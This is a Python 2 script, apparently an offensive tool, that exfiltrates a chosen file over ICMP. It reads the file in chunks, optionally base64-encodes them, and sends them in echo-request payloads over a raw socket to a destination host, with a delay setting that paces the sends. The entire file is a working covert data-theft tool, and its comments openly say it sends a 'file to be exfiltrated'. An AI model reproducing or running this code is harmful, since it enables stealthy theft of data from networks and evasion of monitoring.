#!/usr/bin/python
from optparse import OptionParser
import socket
import struct
import time
import random
import base64


def generateICMPHeader(icmpID):
    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    # We are sending type 8 (Echo Request) ICMP packetsi
    # checksum is set to 0 but will be calcualted before being sent
    return struct.pack("!bbHHh", 8, 0, 0, random.randint(0,65535), icmpID)



def getSize(fileObject):
    # move the cursor to the end of the file
    fileObject.seek(0,2)
    return fileObject.tell()



"""
      According to RFC 792: The checksum is the 16-bit ones's complement of the one's
      complement sum of the ICMP message starting with the ICMP Type.
      For computing the checksum , the checksum field should be zero.
      This checksum may be replaced in the future.
"""
def checksum(source_string):
    # I'm not too confident that this is right but testing seems to
    # suggest that it gives the same answers as in_cksum in ping.c.
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer



def enc_base64(dataBlob):
    return base64.b64encode(dataBlob)



def main(options):

    icmpSeqNum = 0

    # Open raw ICMP socket
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW, socket.IPPROTO_ICMP)

    # Open file to be exfiltrated
    f = open(options.filename, 'rb')

    # get file size and reset seek pointer
    fileSize =  getSize(f)
    f.seek(0)

    # Calculate number of packets to send
    numPackets = fileSize / options.chunk_size
    if (fileSize % options.chunk_size != 0 ):
        numPackets += 1

    print "Number of packets to send: " + str(numPackets)
    print "Estimated time (seconds) to send file: " + str((numPackets * options.sleep) / 1000.0)

    # Read chunks and send them
    while numPackets > 0:
        chunk = f.read(options.chunk_size)
        print "chunk: " + chunk

        if(options.encoding.lower() == "base64".lower()):
            print "IM HERE!"
            chunk = enc_base64(chunk)

        # Generate ICMP header
        ICMPHeader = generateICMPHeader(icmpSeqNum)

        # Calculate checksum and put it in new ICMP header
        ICMPChecksum = checksum(ICMPHeader + chunk)
        newICMPHeader = ICMPHeader[0:2] + struct.pack('!H', ICMPChecksum) + ICMPHeader[4:]

        # Send!
        s.sendto(newICMPHeader + chunk, (options.dest, 0))
        numPackets -= 1
        icmpSeqNum += 1
        time.sleep(options.sleep / 1000.0)



if __name__ == '__main__':

    # Parse command line options
    parser = OptionParser()
    parser.add_option("-f", "--filename", help="File to send", metavar="FILE")
    parser.add_option("-d", "--dest", action="store", type="string", help="Host to send file")
    parser.add_option("-c", "--chunk_size", type="int", help="Size of ICMP data field")
    parser.add_option("-s", "--sleep", type="int", help="Miliseconds to wait between packets")
    parser.add_option("-e", "--encoding", type="string", help="Encoding type (e.g. base64)")
    (options, args) = parser.parse_args()

    main(options)
